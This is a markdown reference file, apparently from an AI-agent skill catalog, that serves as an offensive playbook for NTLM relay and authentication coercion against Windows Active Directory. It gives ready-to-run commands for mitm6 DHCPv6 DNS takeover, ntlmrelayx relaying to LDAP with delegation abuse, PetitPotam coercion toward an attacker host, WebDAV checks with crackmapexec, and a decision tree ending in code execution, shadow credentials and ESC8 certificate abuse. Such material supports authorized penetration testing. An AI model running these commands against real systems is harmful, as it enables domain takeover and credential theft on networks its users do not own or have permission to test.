# SKILL: NTLM Relay and Authentication Coercion — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [5. MITM6 — IPv6 DNS TAKEOVER](#5-mitm6-ipv6-dns-takeover)
- [6. CROSS-PROTOCOL RELAY](#6-cross-protocol-relay)
- [7. WEBDAV-BASED COERCION](#7-webdav-based-coercion)
- [8. NTLM RELAY DECISION TREE](#8-ntlm-relay-decision-tree)
<!-- zhiyugo:toc:end -->

## 5. MITM6 — IPv6 DNS TAKEOVER

```bash
# mitm6 exploits IPv6 auto-configuration to become DNS server
mitm6 -d domain.com

# Combined with ntlmrelayx
ntlmrelayx.py -6 -t ldap://DC_IP -wh fake-wpad.domain.com --delegate-access -smb2support

# Flow:
# 1. mitm6 sends DHCPv6 replies → victim gets attacker as IPv6 DNS
# 2. Victim queries WPAD → attacker responds
# 3. NTLM auth triggered → relayed to LDAP
# 4. RBCD or shadow credentials set on victim computer
```

---

## 6. CROSS-PROTOCOL RELAY

### SMB → LDAP

Capture SMB authentication, relay to LDAP (requires no LDAP signing enforcement).

```bash
# Coerce SMB auth from DC, relay to LDAP on same or different DC
ntlmrelayx.py -t ldap://DC02_IP --delegate-access -smb2support

# Trigger coercion (attacker receives SMB auth)
PetitPotam.py ATTACKER_IP DC01_IP
```

**Limitation**: SMB → LDAP relay fails if the source uses SMB signing negotiation that indicates relay.

### WebDAV → LDAP

WebDAV from workstations sends NTLM over HTTP → relay to LDAP (no signing issues).

```bash
# WebDAV coercion sends HTTP-based NTLM (no SMB signing concern)
ntlmrelayx.py -t ldap://DC_IP --delegate-access -smb2support

# Coerce via WebDAV (workstation must have WebClient service running)
# Use @ATTACKER_PORT format to force WebDAV
PetitPotam.py ATTACKER@80/test WORKSTATION_IP
```

---

## 7. WEBDAV-BASED COERCION

WebClient service (WebDAV) converts SMB-type coercion to HTTP-based NTLM.

```bash
# Check if WebClient is running (port 80 listener or service query)
crackmapexec smb TARGET -u user -p pass -M webdav

# Start WebDAV coercion (from workstation, not server)
# Force target to authenticate via HTTP:
# Use UNC path format: \\ATTACKER@PORT\share
```

**Key advantage**: HTTP-based NTLM avoids SMB signing requirements.

---

## 8. NTLM RELAY DECISION TREE

```
Want to relay NTLM authentication
│
├── What auth can you capture?
│   ├── Responder poisoning (passive, wait for queries)
│   ├── mitm6 (DHCPv6 DNS takeover, periodic)
│   └── Active coercion → load COERCION_METHODS.md
│
├── What target to relay to?
│   │
│   ├── Need code execution?
│   │   ├── SMB target without signing → ntlmrelayx to SMB (§4)
│   │   └── MSSQL target → ntlmrelayx to MSSQL + xp_cmdshell (§4)
│   │
│   ├── Need domain escalation?
│   │   ├── LDAP signing not enforced?
│   │   │   ├── Relay to LDAP → RBCD (§4)
│   │   │   ├── Relay to LDAP → shadow credentials (§4)
│   │   │   └── Relay to LDAP → add computer + delegate (§4)
│   │   └── LDAP signing enforced?
│   │       └── Relay to ADCS HTTP (ESC8) → certificate (§4)
│   │
│   └── Need certificate?
│       └── Relay to ADCS HTTP/RPC → ESC8/ESC11 (§4)
│
├── Source is SMB-based?
│   ├── Target is SMB → check signing (§2)
│   ├── Target is LDAP → may work (cross-protocol, §6)
│   └── Target is HTTP → works (cross-protocol)
│
├── Source is HTTP-based (WebDAV)?
│   └── Relay to any target (no signing issues, §6/§7)
│
└── Relay fails?
    ├── Check signing requirements (§2)
    ├── Check EPA/channel binding
    ├── Try cross-protocol (SMB → LDAP)
    └── Try WebDAV coercion (avoids SMB signing)
```
